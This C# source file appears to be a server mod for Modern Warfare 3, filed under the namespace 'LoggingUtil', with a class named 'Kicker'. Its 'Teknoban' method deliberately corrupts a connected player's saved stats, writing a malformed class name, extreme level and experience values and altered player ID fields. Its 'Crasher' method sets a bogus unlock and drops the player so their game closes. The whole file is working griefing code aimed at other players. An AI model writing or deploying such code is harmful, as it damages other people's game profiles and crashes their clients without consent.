using InfinityScript;

namespace LoggingUtil
{
    public class Kicker
    {

        /// <summary>function <c>Teknoban</c> Corrupts the stats of the player.</summary>
        public void Teknoban(Entity player)
        {
            string banner = "^ÿÿÿÿ";

            for (int i = 0; i < 15; i++)
            {
                player.SetPlayerData("customClasses", i, "name", banner);
                player.SetPlayerData("customClasses", i, "inUse", true);
            }

            player.SetPlayerData("experience", int.MaxValue);
            player.SetPlayerData("prestige", 69);
            player.SetPlayerData("level", int.MinValue);
            player.SetPlayerData("kills", -1);
            player.SetPlayerData("playerXuidLow", int.MinValue);
            player.SetPlayerData("playerXuidHigh", int.MaxValue);
        }

        /// <summary>function <c>Crasher</c> Closes the game of the player abruptly.</summary>
        public void Crasher(Entity player)
        {
            player.SetPlayerData("persistentWeaponsUnlocked", "iw5_m60jugg", 1);
            Utilities.ExecuteCommand($"dropclient {player.EntRef} \"\"");
        }
    }
}
